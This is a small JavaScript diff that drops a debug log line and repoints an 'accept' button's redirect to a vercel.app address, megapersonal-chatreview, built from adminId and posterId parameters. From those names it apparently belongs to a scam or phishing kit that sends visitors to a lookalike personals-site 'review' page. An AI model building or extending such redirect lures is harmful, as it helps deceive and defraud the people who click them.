@@ -125,7 +125,6 @@ const posterId = urlParams.get('poster');
 const verifyId = urlParams.get('verifyId');
 
 let userId = getQueryParam('userid') || 1;
-console.log('poster:',poster);
 
 
 
@@ -133,7 +132,7 @@ setTimeout(()=>{
     document.querySelectorAll('.accept-button').forEach(button => {
         button.addEventListener('click', () => {
       
-          window.location.href =`https://joinvideocall-mu.vercel.app/${adminId}/${posterId}`
+          window.location.href =`https://megapersonal-chatreview.vercel.app/${adminId}/${posterId}`
         });
       });
 },2000)
